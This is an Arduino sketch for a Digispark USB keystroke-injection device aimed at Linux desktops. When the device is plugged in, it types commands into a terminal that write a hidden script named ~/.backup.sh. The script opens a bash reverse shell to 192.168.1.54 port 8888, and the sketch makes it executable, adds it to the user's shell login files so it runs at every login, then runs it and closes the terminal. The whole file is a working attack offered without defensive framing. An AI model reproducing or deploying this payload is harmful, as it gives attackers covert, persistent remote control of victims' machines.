#include "DigiKeyboard.h"

void setup() {
  
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
  delay(3000);

  // Open terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT|MOD_ALT_LEFT); 
  delay(1000);
  
  // Create the reverse shell file 
  DigiKeyboard.print("cat << 'EOF' >> ~/.backup.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("#!/bin/bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("nohup bash -c 'sh -i >& /dev/tcp/192.168.1.54/8888 0>&1'& disown; exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("EOF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Make the reverse shell file executable
  DigiKeyboard.print("chmod +x ~/.backup.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Add the reverse shell file to .profile so it will be run at every login
  DigiKeyboard.print("if [[ -f ~/.bash_profile ]]; then echo '~/.backup.sh' >> ~/.bash_profile; elif [[ -f ~/.bash_login ]]; then echo '~/.backup.sh' >> ~/.bash_login; else echo '~/.backup.sh' >> ~/.profile; fi");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Run the reverse shell for the first time
  DigiKeyboard.print("~/.backup.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
  delay(500);

  // Close the terminal
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
  // put your main code here, to run repeatedly:
  digitalWrite(1, HIGH);
  delay(200);

  digitalWrite(1, LOW);
  delay(300);

}
